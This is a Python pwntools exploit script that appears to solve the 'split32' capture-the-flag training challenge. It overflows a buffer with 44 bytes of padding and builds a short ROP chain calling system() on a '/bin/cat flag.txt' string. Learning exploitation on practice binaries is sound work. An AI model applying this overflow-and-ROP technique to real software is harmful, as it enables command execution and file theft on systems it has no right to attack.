from pwn import *

split32 = ELF('split32')

rop_chain = "Z"*44                              # overwrite before ret = 44
rop_chain += p32(0x08048430, endian='little')   # system()
rop_chain += "\x90"*4                           # in betweener
rop_chain += p32(0x0804a030, endian='little')   # /bin/cat flag.txt 


p = process(split32.path)
p.recvuntil('> ')
p.sendline(rop_chain)
flag  = p.recv()
print ""
print flag
